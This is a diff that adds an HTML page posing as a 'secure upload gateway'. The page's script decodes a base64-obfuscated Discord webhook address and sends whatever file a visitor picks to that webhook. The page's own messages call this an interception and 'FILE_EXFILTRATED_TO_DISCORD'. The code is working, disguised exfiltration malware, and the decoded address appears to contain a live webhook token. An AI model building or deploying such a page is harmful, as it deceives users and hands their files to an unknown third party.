@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CO3ER - SECURE UPLOAD</title>
+    <style>
+        body { background: #050000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .upload-box { border: 1px solid #ff0000; padding: 2rem; background: #0a0000; box-shadow: 0 0 15px #ff000033; text-align: center; width: 400px; }
+        h2 { font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 1.5rem; }
+        input[type="file"] { margin-bottom: 1rem; color: #880000; }
+        button { background: #ff0000; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; text-transform: uppercase; width: 100%; }
+        button:hover { background: #aa0000; color: #fff; }
+        #status { margin-top: 1rem; font-size: 0.8rem; color: #660000; }
+    </style>
+</head>
+<body>
+
+<div class="upload-box">
+    <h2>SYSTEM UPLOAD GATEWAY</h2>
+    <input type="file" id="fileInput">
+    <button onclick="uploadFile()">Execute Upload</button>
+    <div id="status">READY_FOR_INPUT...</div>
+</div>
+
+<script>
+async function uploadFile() {
+    const fileInput = document.getElementById('fileInput');
+    const status = document.getElementById('status');
+    const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NjAyMTgyODMxNjA0MTIzOC9lQWRJWTcyTlZyMUt6OVNzck5YblA5d1JuUFV0N2s0TndWNnRtUEZMYWl0ZTlZc1ktQmJiZGRHcXBMVTdubUVWZjUtZg==");
+
+    if (fileInput.files.length === 0) {
+        status.innerText = "ERROR: NO_FILE_SELECTED";
+        return;
+    }
+
+    status.innerText = "UPLOADING_TO_CO3ER_VAULT...";
+    
+    const formData = new FormData();
+    formData.append('file', fileInput.files[0]);
+    formData.append('payload_json', JSON.stringify({
+        content: "📁 **New File Intercepted**",
+        embeds: [{
+            title: "File Information",
+            description: `**Name:** ${fileInput.files[0].name}\n**Size:** ${fileInput.files[0].size} bytes`,
+            color: 15548997
+        }]
+    }));
+
+    try {
+        const response = await fetch(webhook, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (response.ok) {
+            status.innerText = "SUCCESS: FILE_EXFILTRATED_TO_DISCORD";
+            fileInput.value = ""; // Clear input
+        } else {
+            status.innerText = "ERROR: BREACH_FAILED";
+        }
+    } catch (error) {
+        status.innerText = "ERROR: CONNECTION_LOST";
+    }
+}
+</script>
+
+</body>
+</html>
